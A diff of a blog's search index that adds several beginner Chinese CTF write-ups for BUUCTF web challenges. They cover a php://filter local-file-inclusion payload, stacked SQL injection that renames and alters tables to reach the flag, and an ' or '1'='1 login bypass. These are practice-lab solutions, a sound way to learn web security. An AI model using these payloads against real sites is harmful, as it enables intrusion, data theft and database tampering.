@@ -1,6 +1,42 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ACTF2020新生赛Include</title>
+    <url>/2021/11/13/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DInclude/</url>
+    <content><![CDATA[<p>​        这个题主要考查的是php封装协议。本人小白一个，有错希望大佬指出，如有更好的方法欢迎交流。</p>
+<span id="more"></span>
+
+<ul>
+<li><p>首先 F12 查看网页前端源码，没有什么隐藏信息</p>
+</li>
+<li><p>然后用Burp Suite抓包，也没发现有什么页面跳转，如下图所示    </p>
+</li>
+</ul>
+<p>![image-20211113224115711]([ACTF2020 新生赛]Include/image-20211113224115711.png)      </p>
+<ul>
+<li><p>发现它文件包含的文件名是flag.php，还提问你能发现flag。猜测flag在这个flag.php文件中，但是前端没有显示，所以尝试把flag.php源码输出</p>
+</li>
+<li><p>构建payload：<a href="http://c6220dd2-f0d2-4a5b-919b-b9b6ce8c077f.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php%EF%BC%8C">http://c6220dd2-f0d2-4a5b-919b-b9b6ce8c077f.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php，</a></p>
+</li>
+<li><p>如果不理解这个payload可以看一下这位大佬<a href="https://www.cnblogs.com/shellr00t/p/7638034.html">sm0nk</a>写的博客</p>
+</li>
+</ul>
+<p>![image-20211113224849752]([ACTF2020 新生赛]Include/image-20211113224849752.png)</p>
+<ul>
+<li>由于经过base64加密，解密一下得到flag</li>
+</ul>
+<p>![image-20211113225129535]([ACTF2020 新生赛]Include/image-20211113225129535.png)</p>
+]]></content>
+      <categories>
+        <category>ctf习题</category>
+      </categories>
+      <tags>
+        <tag>web练习题</tag>
+        <tag>BUUCTF</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HCTF 2018 WarmUp的write_up</title>
     <url>/2021/11/02/test/</url>
     <content><![CDATA[<p>本人菜鸟一个，大佬轻喷。</p>
@@ -41,6 +77,148 @@
         <tag>web练习题</tag>
         <tag>BUUCTF</tag>
         <tag>PHP代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>强网杯2019_随便注</title>
+    <url>/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
+    <content><![CDATA[<p>​    这个题主要考查的是堆叠注入。本人小白一个，有错希望大佬指出，如有更好的方法欢迎交流。</p>
+<span id="more"></span>
+
+<ul>
+<li>输入1’ 报错，说明使用了单引号闭合</li>
+</ul>
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164116718.png" alt="image-20211104164116718"></p>
+<ul>
+<li>输入下列payload后没有什么有用信息</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164155636.png" alt="image-20211104164155636"></p>
+<ul>
+<li>在输入union select查询语句后，返回截面为下图。说明一些关键字被正则匹配给过滤了</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select database(),version() --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104163852628.png" alt="image-20211104163852628"></p>
+<ul>
+<li>实在没法了，看了一下其他师傅写的wp，发现是用到<a href="https://www.cnblogs.com/backlion/p/9721687.html">堆叠注入</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show databases;  #查看数据库</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164342551.png" alt="image-20211104164342551"></p>
+<ul>
+<li>在用下列语句查看表，发现有两张表，表名分别为`1919810931114514`,words</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show tables; #查看表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164435930.png" alt="image-20211104164435930"></p>
+<ul>
+<li>用显示表结构的语句查询</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#显示表结构的2种方法</span><br><span class="line">show columns from 表名</span><br><span class="line">desc 表名</span><br></pre></td></tr></table></figure>
+
+<p>​        <strong>如下图显示的是表words的结构</strong></p>
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164555444.png" alt="image-20211104164555444">        <strong>如下图显示的是表`1919810931114514`的结构</strong><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104164756038.png" alt="image-20211104164756038"></p>
+<p>​        经过上面的返回结果来看，可以推测出输入的值经过过滤，最后是在words表中提取相关信息并返回。但是现在flag在`1919810931114514` 中。</p>
+<ul>
+<li><h5 id="方法一：改表名"><a href="#方法一：改表名" class="headerlink" title="方法一：改表名"></a>方法一：改表名</h5><ol>
+<li><p>把words的表名改为words123等</p>
+</li>
+<li><p>然后把`1919810931114514` 表名改为words（在这个过程中需注意表名是纯数字时，要这样写`1919810931114514` ）</p>
+</li>
+<li><p> 然后原来的`1919810931114514` 表(现在修改为表名为words)增加一列 id</p>
+</li>
+</ol>
+<p>payload如下</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to words1;  rename table `1919810931114514` to words; alter table words add column id int primary key auto_increment; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>再次输入1成功得到flag</li>
+</ul>
+<p><img src="/2021/11/04/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/image-20211104172657257.png" alt="image-20211104172657257"></p>
+<ul>
+<li><h5 id="方法二：预处理"><a href="#方法二：预处理" class="headerlink" title="方法二：预处理"></a>方法二：预处理</h5><p><a href="https://www.cnblogs.com/wjw-zm/p/12359735.html">借鉴这位师傅的wp</a></p>
+<p><a href="https://www.runoob.com/php/php-mysql-prepared-statements.html">MySQL预处理的知识</a></p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prepare sql_name from sql语句 #预定义SQL语句</span><br><span class="line">execute sql_name  #执行预定义SQL语句</span><br><span class="line">(deallocate | drop) prepare sql_name #删除预定义SQL语句</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><h5 id="方法三-MySQL的handler"><a href="#方法三-MySQL的handler" class="headerlink" title="方法三:  MySQL的handler"></a>方法三:  MySQL的handler</h5><p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">MySQL 之 handler 的详细使用及说明</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf习题</category>
+      </categories>
+      <tags>
+        <tag>web练习题</tag>
+        <tag>BUUCTF</tag>
+        <tag>sql注入</tag>
+        <tag>堆叠注入</tag>
+        <tag>奇葩的姿势</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战2019_EasySQL</title>
+    <url>/2021/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/</url>
+    <content><![CDATA[<p>​        这个题主要考查的是对用户名和密码的查询。本人小白一个，有错希望大佬指出，如有更好的方法欢迎交流。</p>
+<span id="more"></span>
+
+<ul>
+<li>在输入单引号时报错了,说明存在注入</li>
+</ul>
+<img src="/2021/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/image-20211104162042227.png" alt="image-20211104162042227">
+
+<ul>
+<li>在MySQL数据库中一般查询用户名和密码是否正确时，通常会使用这些语句</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$uname = $_GET[&#x27;username&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;password&#x27;];</span><br><span class="line">select * from 表名 where username = &#x27;$uname&#x27; and  password = &#x27;passwd&#x27;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后可以输入下图用户名和密码尝试闭合</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">123456&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/image-20211104160334757.png" alt="image-20211104160334757"></p>
+<ul>
+<li>然后得到flag</li>
+</ul>
+<p><img src="/2021/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL/image-20211104162629073.png" alt="image-20211104162629073"></p>
+]]></content>
+      <categories>
+        <category>ctf习题</category>
+      </categories>
+      <tags>
+        <tag>web练习题</tag>
+        <tag>BUUCTF</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战2019Havefun</title>
+    <url>/2021/11/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/</url>
+    <content><![CDATA[<p>这个较为基础，建议看了之后还不懂的朋友学习一下php，本人小白一个，知识有限，不足之处大家见谅!</p>
+<span id="more"></span>
+
+<ul>
+<li><p>打开靶场，就只有一只猫，F12后，发现一段PHP代码，构建payload</p>
+<p><img src="/2021/11/02/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/image-20211102195134710.png" alt="image-20211102195134710"></p>
+</li>
+</ul>
+<p>是一个较为简单的php代码审计，主要考察点在于php中的$_GET的用法</p>
+]]></content>
+      <categories>
+        <category>ctf习题</category>
+      </categories>
+      <tags>
+        <tag>web练习题</tag>
+        <tag>BUUCTF</tag>
       </tags>
   </entry>
 </search>
